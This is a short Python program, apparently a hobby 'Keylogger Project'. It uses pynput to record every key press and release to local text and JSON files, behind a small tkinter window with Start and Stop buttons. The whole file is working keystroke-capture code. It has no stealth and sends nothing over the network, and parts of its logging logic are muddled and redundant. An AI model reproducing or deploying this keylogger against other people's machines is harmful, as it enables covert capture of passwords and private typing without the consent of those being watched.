import tkinter as tk
from tkinter import *
from pynput.keyboard import Key,Listener
from datetime import datetime
from pynput import keyboard
import json


listener = None
key_list = []
x = False
key_strokes=""

with open("keylogger.txt", "a") as f:
    f.write("TimeStamps"+(str(datetime.now()))[:-7]+":\n")
    f.write("\n")
    
def update_txt_file(key):
   with open('log.txt','w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('keylogger.json','+wb') as key_log:
        key_list_bytes=json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


def on_press(key):
    global x,key_list
    key_list.append(key)
    write_file(key_list)
    key_list=[]
            
    if x == False:
        key_list.append(
            {'Pressed':f'{key}'}
            
        )
        x = True
    if x == True:
        key_list.append(
            {'Held':f'{key}'}

        )
    update_json_file(key_list)


def on_release(key):
    global x,key_list,key_strokes
    if key==Key.esc:
        return False
    key_list.append(
        {'Released':f'{key}'}
        
    )
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))

def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for idx, key in enumerate(keys):
            k = str(keys).replace("'", "")
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')    

root = Tk()
root.title("Keylogger Project")

label = Label(root, text="Click Start to begin keylogging.")
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack()

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack()

root.geometry("300x110") 

root.mainloop()

print("[+] Running keylogger Succesfully!\n[!] Saving the key logger is 'logs.json'")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
        
